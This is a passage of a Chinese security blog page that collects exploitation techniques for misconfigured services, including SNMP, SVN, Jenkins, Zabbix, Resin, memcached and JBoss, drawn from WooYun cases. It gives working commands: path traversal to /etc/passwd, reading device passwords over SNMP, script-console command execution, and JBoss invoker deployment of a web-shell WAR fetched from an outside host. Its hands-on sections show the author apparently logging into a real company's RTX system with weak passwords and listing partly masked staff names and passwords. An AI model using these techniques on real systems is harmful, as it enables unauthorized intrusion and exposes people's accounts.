rel="noopener">http://www.fff.com/fff.zip</a></p></li></ul><p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p><h1 id="11-目录遍历并查看敏感数据"><a href="#11-目录遍历并查看敏感数据" class="headerlink" title="11 目录遍历并查看敏感数据 "></a>11 目录遍历并查看敏感数据 </h1><p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p><h2 id="11-1-利用方式"><a href="#11-1-利用方式" class="headerlink" title="11.1 利用方式 "></a>11.1 利用方式 </h2><p>根据从wooyun上看到的漏洞，其发现方式主要有:</p><ul><li><p>wvs扫描目录 (inc，<br>返回312，直接访问看到目录列表)</p></li><li><p>常见泄露路径：</p></li></ul><p><a href="http://www.xxx.com/caches" target="_blank" rel="noopener">http://www.xxx.com/caches</a></p><p><a href="http://www.xxx.com/database" target="_blank" rel="noopener">http://www.xxx.com/database</a></p><p><a href="http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd" target="_blank" rel="noopener">http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</a></p><h1 id="12-SNMP信息泄露"><a href="#12-SNMP信息泄露" class="headerlink" title="12 SNMP信息泄露 "></a>12 SNMP信息泄露 </h1><p>drops.wooyun.org/tips/409</p><h2 id="12-1-基本原理"><a href="#12-1-基本原理" class="headerlink" title="12.1 基本原理 "></a>12.1 基本原理 </h2><p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p><p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p><p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p><p>（community相当于认证口令）</p><p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p><p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p><p>信息，若不一致则不返回任何信息。</p><p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p><p>信息（主要是路由交换设备方面）。</p><h2 id="12-2-snmp弱口令"><a href="#12-2-snmp弱口令" class="headerlink" title="12.2 snmp弱口令 "></a>12.2 snmp弱口令 </h2><p>snmp服务器的默认密码为public，漏洞发现与扫描：</p><ul><li><p>x-scan扫描 + GFI LANGard利用</p></li><li><p>使用Snmp Digger进行漏洞利用</p></li><li><p>snmputil.exe</p></li></ul><p>snmputil.exe get|getnext|walk agent community oid[oid……]</p><p>当前进程列表 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.4.2.1.2</p><p>系统用户列表 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.2.25.1.1</p><p>列 出 域 名 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.4.1.0</p><p>列出安装软件 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.6.3.1.2</p><p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p><ul><li>IP Network<br>Browser（snmp浏览工具）</li></ul><h2 id="12-3-snmp获取管理员密码"><a href="#12-3-snmp获取管理员密码" class="headerlink" title="12.3 snmp获取管理员密码 "></a>12.3 snmp获取管理员密码 </h2><p>snmp默认开放端口: 161</p><ul><li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(<a href="http://www.wooyun.org/bugs/wooyun-2013-021877)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021877)）</a></li></ul><p>扫描工具：<br>solarwinds中的snmpsweep</p><p>升级版：solarwinds工具包中的 ip browser</p><ul><li>华为quidway三层交换</li></ul><p>利用这个OID读出的密码为明文（WooYun-2013-21964(<a href="http://www.wooyun.org/bugs/wooyun-2013-021964)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021964)）</a></p><p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x<br>1.3.6.1.4.1.2011.5.2.1.10.1</p><p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p><p>1.3.6.1.4.1.2011.5.2.1.10.1</p><p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p><p>1.3.6.1.4.1.25506.2.12.1.1.1</p><h2 id="12-4-实战演练"><a href="#12-4-实战演练" class="headerlink" title="12.4 实战演练 "></a>12.4 实战演练 </h2><p><code>snmpwalk -v 2c -c public xx.xx.xx.xx</code></p><p><img src="\assets\img\安全运维\file_html_41e07a3a71e3e362.png" alt=""></p><h1 id="13-SVN源码泄露"><a href="#13-SVN源码泄露" class="headerlink" title="13 SVN源码泄露 "></a>13 SVN源码泄露 </h1><p>drops.wooyun.org/tips/352(<a href="http://drops.wooyun.org/tips/352" target="_blank" rel="noopener">http://drops.wooyun.org/tips/352</a>)</p><h2 id="13-1-SVN介绍"><a href="#13-1-SVN介绍" class="headerlink" title="13.1 SVN介绍 "></a>13.1 SVN介绍 </h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p><p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository<br>Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p><p>svn默认端口是3690</p><h2 id="13-2-漏洞原理"><a href="#13-2-漏洞原理" class="headerlink" title="13.2 漏洞原理 "></a>13.2 漏洞原理 </h2><p>程序导出方式：</p><p>在现实开发环境中，建议使用导出功能svn<br>export（而不是svn co）</p><p>svn co ：【导出结果带 .svn<br>文件夹的目录树】</p><p>svn co http://路径[本地目录全路径]<br>–username 用户名 –password 密码</p><p>svn co svn://路径[本地目录全路径]<br>–username 用户名 –password 密码</p><p>svn export ：【导出结果不带 .svn<br>文件夹的目录树】</p><p>svn export [-r版本号]<br>http://路径[本地目录全路径] –username<br>用户名 –password 密码</p><p>svn export [-r版本号]<br>svn://路径[本地目录全路径] –username<br>用户名 –password 密码</p><p>漏洞产生原因：</p><p>在实际开发环境中，很管理员直接把svn<br>co导出来的代码放到web目录下，致使 .svn<br>隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p><p>漏洞利用方式：</p><p>若 .svn目录没有做访问权限限制，可以通过<br>.svn 来遍历文件和目录列表。</p><p>若<br>*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p><p>若<br>*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p><ul><li><p>直接在浏览器中访问 /.svn/entries</p></li><li><p>利用seay的svn工具</p></li></ul><h1 id="14-hadhoop应用对外访问"><a href="#14-hadhoop应用对外访问" class="headerlink" title="14 hadhoop应用对外访问 "></a>14 hadhoop应用对外访问 </h1><h2 id="14-1-基础概念"><a href="#14-1-基础概念" class="headerlink" title="14.1 基础概念 "></a>14.1 基础概念 </h2><p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p><h2 id="14-2-漏洞利用"><a href="#14-2-漏洞利用" class="headerlink" title="14.2 漏洞利用 "></a>14.2 漏洞利用 </h2><p>默认开放端口：</p><p>hadoop 50070</p><p>hbase 50075</p><p>hdfs 50090</p><ul><li><p>Hadoop管理界面弱口令，例如：admin 123456<br>WooYun-2014-58320(<a href="http://www.wooyun.org/bugs/wooyun-2014-058320" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-058320</a>)</p></li><li><p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2<br>RC版本的管理web端能远程执行命令（jstack<br>pstack<br>servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。<br>WooYun-2013-20282(<a href="http://www.wooyun.org/bugs/wooyun-2013-020282" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-020282</a>)</p></li></ul><h1 id="15-Nagios信息泄露"><a href="#15-Nagios信息泄露" class="headerlink" title="15 Nagios信息泄露 "></a>15 Nagios信息泄露 </h1><p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p><h2 id="15-1-漏洞利用"><a href="#15-1-漏洞利用" class="headerlink" title="15.1 漏洞利用 "></a>15.1 漏洞利用 </h2><p>Nagios运维监控API接口暴露<br>WooYun-2014-86842(<a href="http://wooyun.org/bugs/wooyun-2014-086842" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2014-086842</a>)</p><h1 id="16-RTX即时通信信息泄露"><a href="#16-RTX即时通信信息泄露" class="headerlink" title="16 RTX即时通信信息泄露 "></a>16 RTX即时通信信息泄露 </h1><p>腾讯通RTX(Real Time<br>eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p><h2 id="16-1-漏洞利用"><a href="#16-1-漏洞利用" class="headerlink" title="16.1 漏洞利用 "></a>16.1 漏洞利用 </h2><p>默认开放端口： 8012</p><ul><li>开放应用端口暴露：<br><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a></li></ul><p>直接可以访问到所有用户id、用户名等信息的json</p><p>在“查看审核结果处”尝试用户名+弱口令(3102<br>或123456)登陆，登陆成功后即进入内部网络。</p><ul><li>得到用户名后，可以读取手机号</li></ul><p>用户名： rtx.bxlq.com/userlist.php</p><p>手机号：<br>rtx.bxlq.com/getmobile.cgi?receiver=用户名</p><h2 id="16-2-动手实践"><a href="#16-2-动手实践" class="headerlink" title="16.2 动手实践 "></a>16.2 动手实践 </h2><p><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p><p><img src="\assets\img\安全运维\file_html_e1c2ee9745806f6d.png" alt=""></p><p>回到首页，查看审核结果处，进行弱口令尝试：高X军<br>/ 123456</p><p><img src="\assets\img\安全运维\file_html_7d72e064c94b344c.png" alt=""></p><p>回到首页，下载并安装客户端进行登陆</p><p><img src="\assets\img\安全运维\file_html_7624c1251b81f7c6.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_da7cf1ecb96eb2d.png" alt=""></p><p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p><p>高X军 123456</p><p>桂X林 123456</p><p>孔X月 123456</p><p><img src="\assets\img\安全运维\file_html_9c42e03c9ee49942.png" alt=""></p><p>公司领导</p><p><img src="\assets\img\安全运维\file_html_4baa431beadedd58.png" alt=""></p><h1 id="17-Ganglia系统监控信息泄露"><a href="#17-Ganglia系统监控信息泄露" class="headerlink" title="17 Ganglia系统监控信息泄露 "></a>17 Ganglia系统监控信息泄露 </h1><p>Ganglia是UC<br>Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p><p>工作原理：</p><p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p><h2 id="17-1-漏洞利用"><a href="#17-1-漏洞利用" class="headerlink" title="17.1 漏洞利用 "></a>17.1 漏洞利用 </h2><p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p><p>开放端口：8649<br>（不确定，案例中还有开放8000）</p><ul><li><p>直接在浏览器地址栏输入IP:8649 eg:<br><a href="http://xx.xx.xxx.xx:8649/" target="_blank" rel="noopener">http://xx.xx.xxx.xx:8649/</a></p></li><li><p>直接访问域名：ganglia.xx.com</p></li><li><p>使用nc查看： nc.exe iii.com<br>8649 |more</p></li></ul><h1 id="18-j2ee应用架构（web服务器搭配不当）"><a href="#18-j2ee应用架构（web服务器搭配不当）" class="headerlink" title="18 j2ee应用架构（web服务器搭配不当） "></a>18 j2ee应用架构（web服务器搭配不当） </h1><p>drops.wooyun.org/papers/60</p><p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p><p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p><p>Tomcat：免费开放源代码的j2ee<br>Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p><h2 id="18-1-漏洞成因"><a href="#18-1-漏洞成因" class="headerlink" title="18.1 漏洞成因 "></a>18.1 漏洞成因 </h2><p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p><p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p><p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p><p>lib目录：所有框架、插件和组件的架包；</p><p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p><p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p><p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp<br>、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p><h2 id="18-2-漏洞利用"><a href="#18-2-漏洞利用" class="headerlink" title="18.2 漏洞利用 "></a>18.2 漏洞利用 </h2><p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p><h2 id="18-3-修复方案"><a href="#18-3-修复方案" class="headerlink" title="18.3 修复方案 "></a>18.3 修复方案 </h2><ul><li><p>最好不要映射非静态文件目录或敏感目录；</p></li><li><p>修改nginx配置文件，禁止访问WEB-INF文件<br>:<code>Location ~ ^/WEB-INF/* {deny all;}</code></p></li></ul><h1 id="19-Jenkins平台未设置登录验证"><a href="#19-Jenkins平台未设置登录验证" class="headerlink" title="19 Jenkins平台未设置登录验证 "></a>19 Jenkins平台未设置登录验证 </h1><p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p><h2 id="19-1-漏洞利用"><a href="#19-1-漏洞利用" class="headerlink" title="19.1 漏洞利用 "></a>19.1 漏洞利用 </h2><ul><li>未授权访问，可直接执行命令 wooyun-2013-028803</li></ul><p>直接在url中访问： eg:<br><a href="http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)" target="_blank" rel="noopener">http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)</a><br>(端口视具体情况而定，案例中有3000、8888)</p><ul><li><a href="http://ip/script" target="_blank" rel="noopener">http://ip/script</a></li></ul><p>java.lang.Runtime.getRuntime().exec(‘id’).getText();<br>行脚本并回显一句话</p><h1 id="20-zabbix默认口令"><a href="#20-zabbix默认口令" class="headerlink" title="20 zabbix默认口令 "></a>20 zabbix默认口令 </h1><h2 id="20-1-基础知识"><a href="#20-1-基础知识" class="headerlink" title="20.1 基础知识 "></a>20.1 基础知识 </h2><p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p><p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p><h2 id="20-2-利用方式"><a href="#20-2-利用方式" class="headerlink" title="20.2 利用方式 "></a>20.2 利用方式 </h2><p>弱口令进入后台： <a href="http://ip/zabbix/" target="_blank" rel="noopener">http://ip/zabbix/</a> admin / zabbix</p><p>攻击方法：</p><ul><li><p>尝试system.run执行命令</p></li><li><p>获取zabbix server shell：</p></li></ul><p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为<br>uname -a)</p><p>Monitoring——&gt;Last data——&gt;点击Zabbix<br>server，执行调用命令</p><h1 id="21-zenoss默认口令"><a href="#21-zenoss默认口令" class="headerlink" title="21 zenoss默认口令 "></a>21 zenoss默认口令 </h1><h2 id="21-1-基本知识"><a href="#21-1-基本知识" class="headerlink" title="21.1 基本知识 "></a>21.1 基本知识 </h2><p>Zenoss<br>Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p><h2 id="21-2-漏洞利用"><a href="#21-2-漏洞利用" class="headerlink" title="21.2 漏洞利用 "></a>21.2 漏洞利用 </h2><p>ip:8080 admin / zenoss</p><p>ip:8080/zport/dmd/Dashboard</p><p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p><p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p><ul><li><p>wooyun-2013-019917 反弹获取shell</p></li><li><p>wooyun-2013-019917<br>边界神器py版开启socks代理</p></li></ul><p>（zone.wooyun.org/content/1693）</p><ul><li>wooyun-2013-019917<br>端口转发（将代理端口转发到公网）</li></ul><h1 id="22-Resin任意文件读取"><a href="#22-Resin任意文件读取" class="headerlink" title="22 Resin任意文件读取 "></a>22 Resin任意文件读取 </h1><h2 id="22-1-基本知识"><a href="#22-1-基本知识" class="headerlink" title="22.1 基本知识 "></a>22.1 基本知识 </h2><p>Resin：java应用服务器</p><p>CAUCHO公司产品，是一个非常流行的application server<br>，对server和JSP提供良好的支持，速度非常快直逼APACHE<br>SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p><h2 id="22-2-漏洞利用"><a href="#22-2-漏洞利用" class="headerlink" title="22.2 漏洞利用 "></a>22.2 漏洞利用 </h2><p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p><ul><li>任意文件读取：</li></ul><p>配置文件：</p><p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</a></p><p>读取源码：</p><p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</a></p><p>读取password.xml</p><p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p><ul><li>resin文件包含漏洞shell (wooyun-2013-023139)</li></ul><p><a href="http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini" target="_blank" rel="noopener">http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini</a></p><ul><li>resin弱口令</li></ul><p><a href="http://ip/resin-admin/status.php" target="_blank" rel="noopener">http://ip/resin-admin/status.php</a> admin / admin</p><ul><li>resin版本过低，导致磁盘信息泄露</li></ul><p><a href="http://ip/c:/" target="_blank" rel="noopener">http://ip/c:/</a></p><h2 id="22-3-实例演练"><a href="#22-3-实例演练" class="headerlink" title="22.3 实例演练 "></a>22.3 实例演练 </h2><p><a href="http://www.xx.cn/c:/" target="_blank" rel="noopener">http://www.xx.cn/c:/</a> （wooyun-2013-041338）</p><p><img src="\assets\img\安全运维\file_html_c53a22d32c38834b.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_6a5593fbd445e703.png" alt=""></p><h1 id="23-memcache未限制访问IP"><a href="#23-memcache未限制访问IP" class="headerlink" title="23 memcache未限制访问IP "></a>23 memcache未限制访问IP </h1><h2 id="23-1-基础知识"><a href="#23-1-基础知识" class="headerlink" title="23.1 基础知识 "></a>23.1 基础知识 </h2><p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p><h2 id="23-2-漏洞利用"><a href="#23-2-漏洞利用" class="headerlink" title="23.2 漏洞利用 "></a>23.2 漏洞利用 </h2><p>Memcached未限制IP导致cache泄露<br>服务默认端口：11211</p><ul><li>使用nc 反弹查看数据：</li></ul><p>nc.exe –vv ip 11211</p><p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p><p>(UNKNOWN) [ip] 11211 (?) open</p><p>stats items</p><p>STAT items:4:number 1544729</p><p>…….</p><ul><li>memcached空口令访问 可以直接telnet登陆<br>wooyun-2010-0123604</li></ul><ul><li>root@kali:~# nc ip 11211</li></ul><h2 id="23-3-实战演练"><a href="#23-3-实战演练" class="headerlink" title="23.3 实战演练 "></a>23.3 实战演练 </h2><p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p><p><img src="\assets\img\安全运维\file_html_ba1df478b9b7aee9.png" alt=""></p><p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p><p><img src="\assets\img\安全运维\file_html_df926128a0be01ea.png" alt=""></p><h1 id="24-Jboss配置不当"><a href="#24-Jboss配置不当" class="headerlink" title="24 Jboss配置不当 "></a>24 Jboss配置不当 </h1><p>drops.wooyun.org/papers/178</p><h2 id="24-1-基本信息"><a href="#24-1-基本信息" class="headerlink" title="24.1 基本信息 "></a>24.1 基本信息 </h2><p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><p>Jboss应用服务框架：</p><ul><li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li></ul><p><img src="\assets\img\安全运维\file_html_7ca4d6381121d244.png" alt=""></p><p>设备层（instrumentation）：定义信息模型。</p><p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p><p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p><ul><li>JMX<br>Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li></ul><p>这些请求都是用MBean服务器发送到响应的Mbean服务</p><ul><li>Deployer架构：</li></ul><p>JAR（Java<br>Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p><p>WAR（Web<br>ARchives），JAR文件包含一个Web应用程序的组件。</p><h2 id="24-2-漏洞利用"><a href="#24-2-漏洞利用" class="headerlink" title="24.2 漏洞利用 "></a>24.2 漏洞利用 </h2><ul><li>WAR文件 </li></ul><p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK<br>jar命令创建。</p><ul><li>JMX Console</li></ul><p>web-console</p><p>jmx-console</p><p>invoker/JMXInvokerServlet</p><p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p><p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p><p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p><p>War包的部署，执行shell命令。</p><ul><li>Jboss弱口令</li></ul><p><a href="http://IP/admin-console" target="_blank" rel="noopener">http://IP/admin-console</a> admin / admin</p><h2 id="24-3-实例应用"><a href="#24-3-实例应用" class="headerlink" title="24.3 实例应用 "></a>24.3 实例应用 </h2><p><a href="http://yy.yy.yy.yy:8080/web-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy:8080/web-console/</a> 未授权访问</p><p><img src="\assets\img\安全运维\file_html_8e55e3f044ed0364.png" alt=""></p><p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p><p><img src="\assets\img\安全运维\file_html_90d6709742b78542.png" alt=""></p><h3 id="admin-console-getshell"><a href="#admin-console-getshell" class="headerlink" title=" admin-console getshell"></a><1> admin-console getshell</1></h3><p><a href="http://yy.yy.yy.yy/admin-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/admin-console/</a> 无效</p><p><img src="\assets\img\安全运维\file_html_28bdb02a0cb5a373.png" alt=""></p><h3 id="jmx-console-getshell"><a href="#jmx-console-getshell" class="headerlink" title=" jmx-console getshell"></a><2> jmx-console getshell</2></h3><p><a href="http://yy.yy.yy.yy/jmx-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/jmx-console/</a> 存在</p><p>需要将war包或jsp shell放到服务器上<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p><p>jboss.deployment——&gt;void addURL</p><p><img src="\assets\img\安全运维\file_html_d6a528da8f01270e.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_fa352df195521efa.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_5acfb48291d0131b.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_b4b2160d26750158.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_cc69a4e856862c50.png" alt=""></p><p>上传成功，但是文件访问不存在</p><p><img src="\assets\img\安全运维\file_html_6201bba2e6c4598.png" alt=""></p><h3 id="web-console-getshell"><a href="#web-console-getshell" class="headerlink" title=" web-console getshell"></a><3> web-console getshell</3></h3><p><a href="http://xx.xx.xx.xx/web-console/" target="_blank" rel="noopener">http://xx.xx.xx.xx/web-console/</a> 存在</p><p><img src="\assets\img\安全运维\file_html_15bb592501eaeab4.png" alt=""></p><h3 id="invoker-getshell"><a href="#invoker-getshell" class="headerlink" title=" invoker getshell"></a><41> invoker getshell</41></h3><p>inovker接口未配置认证信息</p><p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p><p><img src="\assets\img\安全运维\file_html_51cd584709c21a49.png" alt=""></p><p>案例<a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p><p>curl <a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p><p><img src="\assets\img\安全运维\file_html_ce74e6ffdf131681.png" alt=""></p><p>查看系统名称：</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSName</p><p>Windows 2003</p><p><img src="\assets\img\安全运维\file_html_228e2132d6117e7e.png" alt=""></p><p>查看系统版本</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSVersion</p><p><img src="\assets\img\安全运维\file_html_520647a32422e3a2.png" alt=""></p><p>远程部署war包（失败）</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> invoke jboss.system:service=MainDeployer deploy<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p><p><img src="\assets\img\安全运维\file_html_f6f6157ae371b472.png" alt=""></p><p><a href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&amp;cmd=ls" target="_blank" rel="noopener">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a><br>访问shell是失败</p><p><img src="\assets\img\安全运维\file_html_9f1eec4d60316f17.png" alt=""></p><h1 id="25-测试机外网可访问"><a href="#25-测试机外网可访问" class="headerlink" title="25 测试机外网可访问 "></a>25 测试机外网可访问 </h1><p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..<br>此部分不好做归纳，故略过。</p><h1 id="26-padding-oracle-attack"><a href="#26-padding-oracle-attack" class="headerlink" title="26 padding oracle attack "></a>26 padding oracle attack </h1><h2 id="26-1-基础知识"><a href="#26-1-基础知识" class="headerlink" title="26.1 基础知识 "></a>26.1 基础知识 </h2><p>Padding指数据“填充”</p><p>对于<a href="http://baike.baidu.com/view/155969.htm" target="_blank" rel="noopener">加密算法</a>来说，它们是基于等长的“<a href="http://baike.baidu.com/view/702806.htm" target="_blank" rel="noopener">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(<a href="http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS" target="_blank" 